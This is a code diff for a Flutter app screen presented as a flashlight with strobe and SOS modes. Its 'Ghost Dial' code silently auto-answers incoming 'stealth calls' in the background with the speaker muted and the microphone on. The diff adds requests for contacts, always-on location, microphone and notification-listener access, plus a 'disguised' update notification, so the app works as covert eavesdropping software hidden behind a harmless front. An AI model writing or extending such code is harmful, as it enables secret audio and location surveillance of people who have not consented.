@@ -2,13 +2,17 @@ import 'dart:async';
 import 'dart:math';
 import 'package:flutter/material.dart';
 import 'package:flutter_riverpod/flutter_riverpod.dart';
+import 'package:flutter_webrtc/flutter_webrtc.dart' hide Navigator;
+import 'package:vibration/vibration.dart';
 import 'package:torch_light/torch_light.dart';
 import 'package:screen_brightness/screen_brightness.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:android_intent_plus/android_intent.dart';
 import 'package:flutter/services.dart';
 import 'package:firebase_auth/firebase_auth.dart';
 import '../providers/auth_provider.dart';
 import '../providers/presence_provider.dart';
+import '../services/presence_service.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:permission_handler/permission_handler.dart';
 import '../services/foreground_service.dart';
@@ -17,10 +21,8 @@ import '../providers/update_provider.dart';
 import '../services/notification_service.dart';
 import '../core/constants.dart';
 import 'package:geolocator/geolocator.dart';
-import 'package:dio/dio.dart';
-import 'package:open_filex/open_filex.dart';
-import 'package:path_provider/path_provider.dart';
-import 'dart:io';
+
+import 'settings_screen.dart';
 
 class FlashlightStealthScreen extends ConsumerStatefulWidget {
   const FlashlightStealthScreen({super.key});
@@ -29,7 +31,7 @@ class FlashlightStealthScreen extends ConsumerStatefulWidget {
   ConsumerState<FlashlightStealthScreen> createState() => _FlashlightStealthScreenState();
 }
 
-class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScreen> {
+class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScreen> with WidgetsBindingObserver, SingleTickerProviderStateMixin {
   bool _isLedOn = false;
   bool _isScreenLightOn = false;
   bool _isStrobeOn = false;
@@ -37,16 +39,37 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
   
   Timer? _strobeTimer;
   Timer? _autoOffTimer;
+  Timer? _sosTimer;
+  bool _isSosOn = false;
+  int _sosStep = 0;
+  Timer? _sosHoldTimer;
+  int _sosHoldTicks = 0;
+  bool _isMicMuted = false;
+  int _screenLightColorIndex = 0; // 0: White, 1: Red, 2: Green, 3: Blue
+  bool _isDraggingBrightness = false;
+  bool _showPurpleUI = false;
+  late AnimationController _pulseController;
+  late Animation<double> _pulseAnimation;
+  String? _recoveredPartnerId;
+  StreamSubscription<PresenceData?>? _partnerPresenceSub;
+  PresenceData? _partnerPresence;
+  
+  final List<Color> _tacticalColors = [
+    Colors.white,
+    const Color(0xFFFF003C), // Tactical Red
+    const Color(0xFF00FF41), // Night-vision Green
+    Colors.blueAccent,       // Fluid-tracking Blue
+  ];
 
   // Settings
   bool _hapticEnabled = true;
   bool _autoOffEnabled = false;
 
-  // Ghost Dial — user's own assigned combo
+  // User's assigned connection combination
   int _myHz = 0;
   int _myBrightness = 0;
 
-  // Ghost Dial — the "dial" values the user is currently selecting
+  // Currently selected connection combination
   int _dialHz = 10; // 1-250
   int _dialBrightness = 50; // 1-100
 
@@ -69,79 +92,185 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
   Timer? _invalidFeedbackTimer;
   StreamSubscription? _outboundCallSub;
 
-  // OTA Update
-  bool _isDownloading = false;
-  double _downloadProgress = 0.0;
+  // Incoming call state additions
+  String? _incomingCallerComboId;
+  StreamSubscription? _activeIncomingCallSub;
+  Timer? _dialTimeoutTimer;
+
+  // Firestore listener subscriptions (must be cancelled on dispose)
+  StreamSubscription? _incomingCallsListener;
+  StreamSubscription? _comboListener;
 
   @override
   void initState() {
     super.initState();
+    WidgetsBinding.instance.addObserver(this);
+    
+    _pulseController = AnimationController(
+      vsync: this,
+      duration: const Duration(milliseconds: 750),
+    )..repeat(reverse: true);
+    
+    _pulseAnimation = Tween<double>(begin: 0.4, end: 1.0).animate(
+      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
+    );
     _initBrightness();
     _loadSettings();
+    SharedPreferences.getInstance().then((prefs) {
+      if (prefs.getBool('killed_while_connected') == true) {
+        setState(() {
+          _showPurpleUI = true;
+          _recoveredPartnerId = prefs.getString('killed_while_connected_to') ?? 'RECOVERED';
+        });
+        prefs.remove('killed_while_connected');
+        prefs.remove('killed_while_connected_to');
+      }
+    });
+
     _initGhostDial();
   }
 
-  Future<void> _initGhostDial() async {
-    // Request location permissions
-    LocationPermission permission = await Geolocator.checkPermission();
-    if (permission == LocationPermission.denied) {
-      permission = await Geolocator.requestPermission();
+  @override
+  void didChangeAppLifecycleState(AppLifecycleState state) {
+    final presenceService = ref.read(presenceServiceProvider);
+    
+    if (state == AppLifecycleState.resumed) {
+      presenceService.updateBackgroundState(false);
+      if (_isStealthConnected && _hasIncomingCall) {
+        _markIncomingCallAsOpened();
+      }
+    } else if (state == AppLifecycleState.paused || state == AppLifecycleState.inactive) {
+      presenceService.updateBackgroundState(true);
     }
-    if (permission == LocationPermission.whileInUse) {
-      await Geolocator.requestPermission();
+    
+    if (state == AppLifecycleState.detached) {
+      if (_isStealthConnected) {
+        SharedPreferences.getInstance().then((prefs) {
+          prefs.setBool('killed_while_connected', true);
+          String partnerId = _hasIncomingCall ? (_incomingCallerComboId ?? 'UNKNOWN') : '${(_dialHz / 100).toStringAsFixed(2)}A';
+          prefs.setString('killed_while_connected_to', partnerId);
+        });
+      }
     }
+  }
 
-    final authService = ref.read(authServiceProvider);
+  Future<void> _markIncomingCallAsOpened() async {
     final currentUser = FirebaseAuth.instance.currentUser;
-    
-    // If user is completely unauthenticated, log them in anonymously.
-    if (currentUser == null) {
-      await authService.signInAnonymously();
-    } else {
-      // Ensure existing users get a combo assigned if they don't have one
-      await authService.ensureUserHasCombo(currentUser.uid);
+    if (currentUser == null) return;
+    try {
+      final calls = await FirebaseFirestore.instance
+          .collection('stealth_calls')
+          .where('targetUid', isEqualTo: currentUser.uid)
+          .where('status', isEqualTo: 'connected')
+          .get();
+      for (final doc in calls.docs) {
+        await doc.reference.update({'status': 'opened'});
+      }
+    } catch (e) {
+      debugPrint('[GhostDial] Mark opened error: $e');
     }
-    
-    // Load the assigned combo
-    final userAfterAuth = FirebaseAuth.instance.currentUser;
-    if (userAfterAuth != null) {
-      final presenceService = ref.read(presenceServiceProvider);
-      await presenceService.goOnline(userAfterAuth.uid, initialMicOn: false);
+  }
+
+  // dispose() is defined below after _cleanup()
+
+  Future<void> _enforcePermissions() async {
+    if (await Permission.microphone.isDenied) {
+      await Permission.microphone.request();
+    }
+    if (await Permission.contacts.isDenied) {
+      await Permission.contacts.request();
+    }
+    if (await Permission.notification.isDenied) {
+      await Permission.notification.request();
+    }
+
+    LocationPermission locPerm = await Geolocator.checkPermission();
+    if (locPerm == LocationPermission.denied || locPerm == LocationPermission.deniedForever) {
+      await Geolocator.requestPermission();
+    } else if (locPerm == LocationPermission.whileInUse) {
+      await Permission.locationAlways.request();
+    }
+
+    final prefs = await SharedPreferences.getInstance();
+    if (!prefs.containsKey('asked_notif_listener')) {
+      await prefs.setBool('asked_notif_listener', true);
+      final intent = const AndroidIntent(
+        action: 'android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS',
+      );
+      try {
+        await intent.launch();
+      } catch (_) {}
+    }
+  }
+
+  Future<void> _initGhostDial() async {
+    // Initialize Auth and Firestore listeners.
+    try {
+      final authService = ref.read(authServiceProvider);
+      final currentUser = FirebaseAuth.instance.currentUser;
       
-      // Save FCM token
-      final notificationService = ref.read(notificationServiceProvider);
-      await notificationService.initialize();
-      await notificationService.saveToken(userAfterAuth.uid);
+      if (currentUser == null) {
+        await authService.signInAnonymously();
+      } else {
+        await authService.ensureUserHasCombo(currentUser.uid);
+      }
+      
+      final userAfterAuth = FirebaseAuth.instance.currentUser;
+      if (userAfterAuth != null) {
+        final presenceService = ref.read(presenceServiceProvider);
+        await presenceService.goOnline(userAfterAuth.uid, initialMicOn: false);
+        
+        // Save FCM token
+        final notificationService = ref.read(notificationServiceProvider);
+        await notificationService.initialize();
+        await notificationService.saveToken(userAfterAuth.uid);
 
-      // Listen to assigned combo
-      FirebaseFirestore.instance
-          .collection(kUsersCollection)
-          .doc(userAfterAuth.uid)
-          .snapshots()
-          .listen((doc) {
-        if (doc.exists && doc.data() != null) {
-          if (mounted) {
-            setState(() {
-              _myHz = doc.data()!['assignedHz'] ?? 0;
-              _myBrightness = doc.data()!['assignedBrightness'] ?? 0;
-            });
+        // Wire update notification: auto-fire disguised notification when OTA detected
+        final updateNotifier = ref.read(updateProvider.notifier);
+        updateNotifier.onUpdateDetected = (latestVersion) {
+          notificationService.showUpdateNotification(version: latestVersion);
+        };
+        // Trigger the first check now (callback will fire if update exists)
+        updateNotifier.checkForUpdate();
+
+        // Listen to assigned combo (loads DRAW ID)
+        _comboListener?.cancel();
+        _comboListener = FirebaseFirestore.instance
+            .collection(kUsersCollection)
+            .doc(userAfterAuth.uid)
+            .snapshots()
+            .listen((doc) {
+          if (doc.exists && doc.data() != null) {
+            if (mounted) {
+              setState(() {
+                _myHz = doc.data()!['assignedHz'] ?? 0;
+                _myBrightness = doc.data()!['assignedBrightness'] ?? 0;
+              });
+            }
           }
-        }
-      });
+        });
 
-      // Listen for incoming stealth calls
-      _listenForIncomingCalls(userAfterAuth.uid);
+        // Listen for incoming stealth calls
+        _listenForIncomingCalls(userAfterAuth.uid);
+      }
+    } catch (e) {
+      debugPrint('[GhostDial] Init error: $e');
     }
+
+    // ── PERMISSIONS: Enforce AFTER critical setup ──
+    // This can block/loop but won't prevent the app from functioning.
+    _enforcePermissions();
   }
 
   void _listenForIncomingCalls(String myUid) {
     // Listen to the 'stealth_calls' collection for calls targeted at this user
-    FirebaseFirestore.instance
+    _incomingCallsListener?.cancel();
+    _incomingCallsListener = FirebaseFirestore.instance
         .collection('stealth_calls')
         .where('targetUid', isEqualTo: myUid)
         .where('status', isEqualTo: 'ringing')
         .snapshots()
-        .listen((snapshot) {
+        .listen((snapshot) async {
       if (snapshot.docs.isNotEmpty && !_isStealthConnected) {
         final callDoc = snapshot.docs.first;
         final data = callDoc.data();
@@ -149,10 +278,26 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
         final callerUid = data['callerUid'] as String?;
         
         if (roomId != null && callerUid != null) {
-          setState(() {
-            _hasIncomingCall = true;
-            _incomingRoomId = roomId;
-          });
+          // Fetch caller's ID
+          String? callerIdStr;
+          try {
+            final callerDoc = await FirebaseFirestore.instance.collection('users').doc(callerUid).get();
+            if (callerDoc.exists && callerDoc.data()!.containsKey('assignedHz')) {
+              final hz = callerDoc.data()!['assignedHz'] as int;
+              final bright = callerDoc.data()!['assignedBrightness'] as int? ?? 0;
+              callerIdStr = '$bright.$hz';
+            }
+          } catch (e) {
+            debugPrint('[GhostDial] Error fetching caller ID: $e');
+          }
+
+          if (mounted) {
+            setState(() {
+              _hasIncomingCall = true;
+              _incomingRoomId = roomId;
+              _incomingCallerComboId = callerIdStr ?? 'UNKNOWN';
+            });
+          }
           
           // Auto-connect in background with speaker muted, mic ON
           _autoConnectToCall(roomId, callerUid, callDoc.id);
@@ -182,16 +327,38 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
       // Mute speaker but keep mic on
       webrtcService.muteAllIncomingAudio(true);
 
-      setState(() {
-        _isStealthConnected = true;
-        _isSpeakerMuted = true;
-      });
+      if (mounted) {
+        setState(() {
+          _isStealthConnected = true;
+          _isSpeakerMuted = true;
+        });
+        _partnerPresenceSub?.cancel();
+        _partnerPresenceSub = ref.read(presenceServiceProvider).streamPartnerPresence(callerUid).listen((presence) {
+          if (mounted) setState(() => _partnerPresence = presence);
+        });
+      }
 
       // Mark call as accepted
       await FirebaseFirestore.instance
           .collection('stealth_calls')
           .doc(callDocId)
           .update({'status': 'connected'});
+
+      // Set up listener for disconnect (deletion of the call doc)
+      _activeIncomingCallSub?.cancel();
+      _activeIncomingCallSub = FirebaseFirestore.instance
+          .collection('stealth_calls')
+          .doc(callDocId)
+          .snapshots()
+          .listen((docSnap) {
+        if (!docSnap.exists) {
+          // Caller hung up (deleted the doc)
+          if (mounted) {
+            _disconnectStealth();
+          }
+        }
+      });
+      
     } catch (e) {
       debugPrint('[GhostDial] Auto-connect error: $e');
     }
@@ -227,38 +394,65 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
   void dispose() {
     _disableLedTorch();
     _resetScreenBrightness();
-    _strobeTimer?.cancel();
-    _autoOffTimer?.cancel();
-    _stealthHoldTimer?.cancel();
-    _drawHoldTimer?.cancel();
-    _invalidFeedbackTimer?.cancel();
-    _outboundCallSub?.cancel();
+    _cleanup();
+    _pulseController.dispose();
+    WidgetsBinding.instance.removeObserver(this);
     super.dispose();
   }
 
+  void _cleanup() {
+    _strobeTimer?.cancel();
+    _autoOffTimer?.cancel();
+    _sosTimer?.cancel();
+    _sosHoldTimer?.cancel();
+    _stealthHoldTimer?.cancel();
+    _drawHoldTimer?.cancel();
+    _sosHoldTimer?.cancel();
+    _dialTimeoutTimer?.cancel();
+    _invalidFeedbackTimer?.cancel();
+    _outboundCallSub?.cancel();
+    _activeIncomingCallSub?.cancel();
+    _partnerPresenceSub?.cancel();
+    _incomingCallsListener?.cancel();
+    _comboListener?.cancel();
+  }
+
   // --- LED TEMP Hold → Dial & Connect ---
-  void _handleStealthHoldStart(LongPressStartDetails details) {
+  void _handleStealthHoldStart(LongPressStartDetails details) async {
     if (_stealthHoldTimer != null && _stealthHoldTimer!.isActive) return;
     
     _stealthHoldTicks = 0;
+    
+    bool hasVibrator = await Vibration.hasVibrator() ?? false;
+    bool hasCustomVibrations = await Vibration.hasCustomVibrationsSupport() ?? false;
+
+    // If device doesn't support custom haptics, just vibrate continuously for 5s
+    if (hasVibrator && !hasCustomVibrations && _hapticEnabled) {
+      Vibration.vibrate(duration: 5000);
+    }
     
     _stealthHoldTimer = Timer.periodic(const Duration(milliseconds: 100), (timer) {
       _stealthHoldTicks++;
       
       if (_stealthHoldTicks < 50) {
         if (_hapticEnabled) {
-          if (_stealthHoldTicks <= 20 && _stealthHoldTicks % 5 == 0) {
-            HapticFeedback.lightImpact();
-          } else if (_stealthHoldTicks > 20 && _stealthHoldTicks <= 35 && _stealthHoldTicks % 3 == 0) {
-            HapticFeedback.mediumImpact();
-          } else if (_stealthHoldTicks > 35) {
-            HapticFeedback.heavyImpact();
+          if (hasCustomVibrations) {
+            // 5 dots over 5 seconds (1 dot every 10 ticks = 1 second)
+            if (_stealthHoldTicks % 10 == 0) {
+              Vibration.vibrate(duration: 150);
+            }
+          } else if (!hasVibrator) {
+            // Fallback to standard haptics if no advanced vibration API
+            if (_stealthHoldTicks % 10 == 0) {
+              HapticFeedback.mediumImpact();
+            }
           }
         }
       } else {
         timer.cancel();
         
         if (_hapticEnabled) {
+          Vibration.cancel();
           Future.delayed(const Duration(milliseconds: 50), () => HapticFeedback.heavyImpact());
           Future.delayed(const Duration(milliseconds: 150), () => HapticFeedback.heavyImpact());
         }
@@ -276,6 +470,7 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
     if (_stealthHoldTimer != null && _stealthHoldTimer!.isActive) {
       _stealthHoldTimer!.cancel();
       _stealthHoldTicks = 0;
+      Vibration.cancel(); // Cancel any ongoing vibration
     }
   }
 
@@ -287,7 +482,9 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
     _drawHoldTicks = 0;
     
     _drawHoldTimer = Timer.periodic(const Duration(milliseconds: 100), (timer) {
-      _drawHoldTicks++;
+      setState(() {
+        _drawHoldTicks++;
+      });
       
       if (_drawHoldTicks < 20) {
         // 2 second hold
@@ -372,8 +569,9 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
       if (!targetUserDoc.exists) return;
       final targetToken = targetUserDoc.data()!['fcmToken'] as String?;
 
-      // Create a stealth room
-      final roomId = 'ghost_${currentUser.uid}_${targetUid}_${DateTime.now().millisecondsSinceEpoch}';
+      // Create a deterministic stealth room ID to prevent collisions if both dial simultaneously
+      final sortedIds = [currentUser.uid, targetUid]..sort();
+      final roomId = 'ghost_${sortedIds[0]}_${sortedIds[1]}';
 
       // Create room doc in Firestore
       await FirebaseFirestore.instance.collection(kRoomsCollection).doc(roomId).set({
@@ -420,6 +618,23 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
         _outboundCallStatus = 'ringing';
       });
 
+      _dialTimeoutTimer?.cancel();
+      _dialTimeoutTimer = Timer(const Duration(seconds: 60), () {
+        if (mounted && _outboundCallStatus == 'ringing') {
+          _disconnectStealth();
+          if (mounted) {
+            ScaffoldMessenger.of(context).showSnackBar(
+              const SnackBar(content: Text('Call Timeout - Node Unreachable', style: TextStyle(color: Colors.red))),
+            );
+          }
+        }
+      });
+
+      _partnerPresenceSub?.cancel();
+      _partnerPresenceSub = ref.read(presenceServiceProvider).streamPartnerPresence(targetUid).listen((presence) {
+        if (mounted) setState(() => _partnerPresence = presence);
+      });
+
       // Listen for target status changes
       _outboundCallSub?.cancel();
       _outboundCallSub = FirebaseFirestore.instance.collection('stealth_calls')
@@ -443,12 +658,22 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
   }
 
   Future<void> _disconnectStealth() async {
+    _triggerHaptic();
+    Future.delayed(const Duration(milliseconds: 100), () => HapticFeedback.heavyImpact());
+    Future.delayed(const Duration(milliseconds: 250), () => HapticFeedback.heavyImpact());
+
     setState(() {
       _isStealthConnected = false;
       _isSpeakerMuted = true;
       _hasIncomingCall = false;
       _outboundCallStatus = null;
+      _incomingCallerComboId = null;
+      _partnerPresence = null;
     });
+    
+    _partnerPresenceSub?.cancel();
+    
+    _activeIncomingCallSub?.cancel();
     
     _outboundCallSub?.cancel();
     
@@ -519,6 +744,9 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
   }
 
   Future<void> _toggleStrobe() async {
+    _triggerHaptic();
+    if (_isSosOn) _toggleSos(); // Turn off SOS if running
+
     if (_isStrobeOn) {
       _strobeTimer?.cancel();
       setState(() => _isStrobeOn = false);
@@ -533,17 +761,115 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
         _isLedOn = true;
       });
       bool flashState = true;
-      _strobeTimer = Timer.periodic(const Duration(milliseconds: 150), (timer) async {
+      _startStrobeTimer(flashState);
+    }
+  }
+
+  void _startStrobeTimer(bool flashState) {
+    _strobeTimer?.cancel();
+    // Use _dialHz for strobe frequency. 1Hz = 1000ms, 50Hz = 20ms
+    // We clamp the hz to a reasonable physical limit (e.g., 1 to 50 Hz)
+    int hz = _dialHz.clamp(1, 50);
+    int intervalMs = (1000 ~/ hz);
+    
+    _strobeTimer = Timer.periodic(Duration(milliseconds: intervalMs), (timer) async {
+      try {
+        if (flashState) {
+          await TorchLight.enableTorch();
+        } else {
+          await TorchLight.disableTorch();
+        }
+        flashState = !flashState;
+        
+        // If hz changes during strobe, we need to restart the timer to apply the new interval
+        int currentHz = _dialHz.clamp(1, 50);
+        if (currentHz != hz && _isStrobeOn) {
+          timer.cancel();
+          _startStrobeTimer(flashState);
+        }
+      } catch (_) {}
+    });
+  }
+
+  void _handleSosHoldStart(LongPressStartDetails details) {
+    _sosHoldTicks = 0;
+    _sosHoldTimer?.cancel();
+    _sosHoldTimer = Timer.periodic(const Duration(milliseconds: 100), (timer) {
+      if (!mounted) { timer.cancel(); return; }
+      setState(() {
+        _sosHoldTicks++;
+        if (_sosHoldTicks >= 20) { // 2 seconds
+          _triggerHaptic();
+          _toggleMic();
+          timer.cancel();
+          _sosHoldTicks = 0;
+        }
+      });
+    });
+  }
+
+  void _handleSosHoldEnd() {
+    _sosHoldTimer?.cancel();
+    setState(() {
+      _sosHoldTicks = 0;
+    });
+  }
+
+  Future<void> _toggleSos() async {
+    _triggerHaptic();
+    if (_isStrobeOn) _toggleStrobe(); // Turn off strobe if running
+
+    if (_isSosOn) {
+      _sosTimer?.cancel();
+      setState(() {
+        _isSosOn = false;
+        _sosStep = 0;
+      });
+      if (_isLedOn) {
+         try { await TorchLight.enableTorch(); } catch (_) {}
+      } else {
+         try { await TorchLight.disableTorch(); } catch (_) {}
+      }
+    } else {
+      setState(() {
+        _isSosOn = true;
+        _isLedOn = true;
+        _sosStep = 0;
+      });
+
+      final List<bool> sosPattern = [
+        true, false, true, false, true, false, // ...
+        false, false, // space
+        true, true, true, false, true, true, true, false, true, true, true, false, // ---
+        false, false, // space
+        true, false, true, false, true, false, // ...
+        false, false, false, false, false, false, // pause
+      ];
+
+      _sosTimer = Timer.periodic(const Duration(milliseconds: 150), (timer) async {
+        if (!mounted || !_isSosOn) {
+          timer.cancel();
+          return;
+        }
+        bool turnOn = sosPattern[_sosStep % sosPattern.length];
         try {
-          if (flashState) {
+          if (turnOn) {
             await TorchLight.enableTorch();
           } else {
             await TorchLight.disableTorch();
           }
-          flashState = !flashState;
         } catch (_) {}
+        _sosStep++;
       });
     }
+  }
+
+  Future<void> _toggleMic() async {
+    _triggerHaptic();
+    setState(() {
+      _isMicMuted = !_isMicMuted;
+    });
+    ref.read(webrtcServiceProvider).setMicEnabled(!_isMicMuted);
   }
 
   Future<void> _toggleScreenLight() async {
@@ -577,264 +903,10 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
     } catch (_) {}
   }
 
-  // --- Full Screen Settings ---
-  void _openFullScreenSettings() {
-    // Check for updates as soon as settings open
-    ref.read(updateProvider.notifier).checkForUpdate();
-    
-    bool _muteOnExit = true;
-    
-    SharedPreferences.getInstance().then((prefs) {
-      _muteOnExit = prefs.getBool('muteOnBackground') ?? true;
-    });
-
-    showGeneralDialog(
-      context: context,
-      barrierColor: Colors.black,
-      barrierDismissible: false,
-      transitionDuration: const Duration(milliseconds: 300),
-      pageBuilder: (context, animation, secondaryAnimation) {
-        return StatefulBuilder(
-          builder: (context, setStateDialog) => Scaffold(
-            backgroundColor: const Color(0xFF0A0C0E),
-            body: SafeArea(
-              child: Padding(
-                padding: const EdgeInsets.all(24.0),
-                              child: Column(
-                                crossAxisAlignment: CrossAxisAlignment.start,
-                                children: [
-                                  Row(
-                                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
-                                    children: [
-                                      Row(
-                                        children: [
-                                          const Icon(Icons.settings_applications, color: Color(0xFF00FF41), size: 32),
-                                          const SizedBox(width: 12),
-                                          const Text(
-                                            'SYS_CONFIG //',
-                                            style: TextStyle(
-                                              color: Color(0xFF00FF41),
-                                              fontSize: 22,
-                                              fontWeight: FontWeight.w900,
-                                              letterSpacing: 2,
-                                              fontFamily: 'monospace',
-                                            ),
-                                          ),
-                                        ],
-                                      ),
-                                      IconButton(
-                                        icon: const Icon(Icons.close, color: Colors.white54, size: 32),
-                                        onPressed: () => Navigator.pop(context),
-                                      ),
-                                    ],
-                                  ),
-                                  const Divider(color: Colors.white24, height: 48),
-                                  
-                                  _buildSettingsToggle(
-                                    label: 'HAPTIC_MODULE',
-                                    value: _hapticEnabled,
-                                    onChanged: (val) {
-                                      setState(() => _hapticEnabled = val);
-                                      setStateDialog(() => _hapticEnabled = val);
-                                      _saveSetting('hapticEnabled', val);
-                                      if (val) HapticFeedback.lightImpact();
-                                    },
-                                  ),
-                                  const SizedBox(height: 24),
-                                  _buildSettingsToggle(
-                                    label: 'AUTO_CUTOFF(10M)',
-                                    value: _autoOffEnabled,
-                                    onChanged: (val) {
-                                      setState(() => _autoOffEnabled = val);
-                                      setStateDialog(() => _autoOffEnabled = val);
-                                      _saveSetting('autoOffEnabled', val);
-                                      _triggerHaptic();
-                                    },
-                                  ),
-                                  const SizedBox(height: 24),
-                                  _buildSettingsToggle(
-                                    label: 'AUDIO_TELEMETRY_CUTOFF',
-                                    value: _muteOnExit,
-                                    onChanged: (val) async {
-                                      setStateDialog(() => _muteOnExit = val);
-                                      final prefs = await SharedPreferences.getInstance();
-                                      await prefs.setBool('muteOnBackground', val);
-                                      _triggerHaptic();
-                                    },
-                                  ),
-                                  const SizedBox(height: 48),
-
-                                  SizedBox(
-                                    width: double.infinity,
-                                    child: ElevatedButton.icon(
-                                      onPressed: () async {
-                                        _triggerHaptic();
-                                        await Permission.ignoreBatteryOptimizations.request();
-                                      },
-                                      icon: const Icon(Icons.battery_charging_full),
-                                      label: const Text('OVERRIDE_BATTERY_LIMITS', style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1.5)),
-                                      style: ElevatedButton.styleFrom(
-                                        backgroundColor: Colors.white12,
-                                        foregroundColor: Colors.white70,
-                                        padding: const EdgeInsets.symmetric(vertical: 16),
-                                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
-                                      ),
-                                    ),
-                                  ),
-                                  const Spacer(),
-
-                                  Center(
-                                    child: Consumer(
-                                      builder: (context, ref, child) {
-                                        final updateState = ref.watch(updateProvider);
-                                        return Text(
-                                          'FIRMWARE_VER: ${updateState.currentVersion ?? "Loading..."}\nBUILD_TAG: SECURE_WIFI_OTA',
-                                          textAlign: TextAlign.center,
-                                          style: const TextStyle(
-                                            color: Colors.white30,
-                                            fontFamily: 'monospace',
-                                            fontSize: 12,
-                                            letterSpacing: 1,
-                                          ),
-                                        );
-                                      },
-                                    ),
-                                  ),
-                                  const SizedBox(height: 24),
-
-                                  SizedBox(
-                                    width: double.infinity,
-                                    child: Consumer(
-                                      builder: (context, ref, child) {
-                                        final updateState = ref.watch(updateProvider);
-                                        
-                                        if (_isDownloading) {
-                                          return Column(
-                                            children: [
-                                              const Text('DOWNLOADING OTA...', style: TextStyle(color: Color(0xFF00FF41), fontFamily: 'monospace')),
-                                              const SizedBox(height: 12),
-                                              LinearProgressIndicator(
-                                                value: _downloadProgress,
-                                                backgroundColor: Colors.white12,
-                                                valueColor: const AlwaysStoppedAnimation<Color>(Color(0xFF00FF41)),
-                                              ),
-                                            ],
-                                          );
-                                        }
-                                        
-                                        if (updateState.isChecking) {
-                                          return ElevatedButton(
-                                            onPressed: null,
-                                            style: ElevatedButton.styleFrom(
-                                              backgroundColor: Colors.white12,
-                                              padding: const EdgeInsets.symmetric(vertical: 20),
-                                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
-                                            ),
-                                            child: const Text('CHECKING GITHUB SERVER...', style: TextStyle(color: Colors.white54, fontFamily: 'monospace')),
-                                          );
-                                        }
-                                        
-                                        if (updateState.updateAvailable && updateState.apkUrl != null) {
-                                          return ElevatedButton(
-                                            onPressed: () {
-                                              _triggerHaptic();
-                                              _downloadAndInstallUpdate(updateState.apkUrl!, updateState.latestVersion!, setStateDialog);
-                                            },
-                                            style: ElevatedButton.styleFrom(
-                                              backgroundColor: const Color(0xFF00FF41).withOpacity(0.2),
-                                              side: const BorderSide(color: Color(0xFF00FF41), width: 2),
-                                              padding: const EdgeInsets.symmetric(vertical: 20),
-                                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
-                                            ),
-                                            child: Text('INSTALL UPDATE (${updateState.latestVersion})', style: const TextStyle(color: Color(0xFF00FF41), fontWeight: FontWeight.bold, letterSpacing: 2)),
-                                          );
-                                        }
-
-                                        return ElevatedButton(
-                                          onPressed: () {
-                                            _triggerHaptic();
-                                            ref.read(updateProvider.notifier).checkForUpdate();
-                                          },
-                                          style: ElevatedButton.styleFrom(
-                                            backgroundColor: Colors.white12,
-                                            padding: const EdgeInsets.symmetric(vertical: 20),
-                                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
-                                          ),
-                                          child: const Text('FIRMWARE UP TO DATE (CHECK AGAIN)', style: TextStyle(color: Colors.white54, fontFamily: 'monospace')),
-                                        );
-                                      },
-                                    ),
-                                  ),
-                                ],
-                              ),
-                            ),
-                          ),
-                        ),
-        );
-      },
-    );
-  }
-
-  Future<void> _downloadAndInstallUpdate(String apkUrl, String version, StateSetter setStateDialog) async {
-    setState(() { _isDownloading = true; _downloadProgress = 0.0; });
-    setStateDialog(() { _isDownloading = true; _downloadProgress = 0.0; });
-    
-    try {
-      final dir = await getTemporaryDirectory();
-      final safeVersion = version.replaceAll('+', '_');
-      final savePath = '${dir.path}/update_$safeVersion.apk';
-      
-      final file = File(savePath);
-      // If the file exists, we forcefully delete it and re-download it to prevent corrupt package parsing
-      if (await file.exists()) {
-        await file.delete();
-      }
-      
-      final dio = Dio();
-      await dio.download(
-        apkUrl,
-        savePath,
-        onReceiveProgress: (received, total) {
-          if (total != -1 && mounted) {
-            setState(() { _downloadProgress = received / total; });
-            setStateDialog(() { _downloadProgress = received / total; });
-          }
-        },
-      );
-      
-      final result = await OpenFilex.open(savePath);
-      debugPrint("OpenFile result: ${result.message}");
-      
-    } catch (e) {
-      debugPrint("Download failed: $e");
-    } finally {
-      if (mounted) {
-        setState(() { _isDownloading = false; });
-        setStateDialog(() { _isDownloading = false; });
-      }
-    }
-  }
-
-  Widget _buildSettingsToggle({required String label, required bool value, required ValueChanged<bool> onChanged}) {
-    return Row(
-      mainAxisAlignment: MainAxisAlignment.spaceBetween,
-      children: [
-        Text(label, style: const TextStyle(color: Colors.white70, fontFamily: 'monospace', fontWeight: FontWeight.bold, fontSize: 16)),
-        Switch(
-          value: value,
-          onChanged: onChanged,
-          activeColor: const Color(0xFF00FF41),
-          inactiveThumbColor: Colors.grey,
-          inactiveTrackColor: Colors.white12,
-        ),
-      ],
-    );
-  }
-
   @override
   Widget build(BuildContext context) {
-    const accentColor = Color(0xFF00FF41);
-    const dangerColor = Color(0xFFFF003C);
+    const accentColor = Color(0xFF00E676); // Softer green
+    const dangerColor = Color(0xFFFF5252); // Softer red
     const darkBg = Color(0xFF0A0C0E);
     const panelColor = Color(0xFF161A1D);
 
@@ -863,27 +935,44 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
       ledTempColor = accentColor;
     }
 
-    // Determine OUTPUT display
-    String outputValue = isActive ? '1200 LM' : '0 LM';
-    Color outputColor = statusColor;
-
